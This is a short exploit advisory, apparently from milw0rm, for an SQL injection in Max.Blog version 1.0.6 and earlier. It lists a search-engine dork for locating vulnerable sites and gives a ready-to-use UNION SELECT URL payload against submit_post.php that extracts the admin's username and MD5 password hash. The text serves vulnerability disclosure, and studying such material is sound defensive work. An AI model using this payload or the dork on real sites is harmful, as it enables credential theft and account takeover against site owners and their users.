@@ -1,0 +1,35 @@
+###################             Salvatore "drosophila" Fresta
+###################
+
+
+Application:    Max.Blog
+                               http://www.mzbservices.com
+Version:                Max.Blog <= 1.0.6
+Bug:            * SQL Injection
+Exploitation:   Remote
+Dork:                   intext:"Powered by Max.Blog"
+Date:           27 Jan 2009
+Discovered by:  Salvatore "drosophila" Fresta
+Author:         Salvatore "drosophila" Fresta
+                       e-mail: drosophilaxxx@gmail.com
+
+
+############################################################################
+
+- BUGS
+
+SQL Injection:
+
+       Requisites: magic quotes = off
+
+       File affected: submit_post.php
+
+       This bug allows a registered user to view username and password
+(md5) of a
+       registered user with the specified id (usually 1 for the admin)
+
+       http://www.site.com/path/submit_post.php?draft=-1'+UNION+ALL+SELECT+1,NULL,NULL,CONCAT(username,char(58),password)+FROM+users+WHERE+id=1%23
+
+############################################################################
+
+# milw0rm.com [2009-01-28]
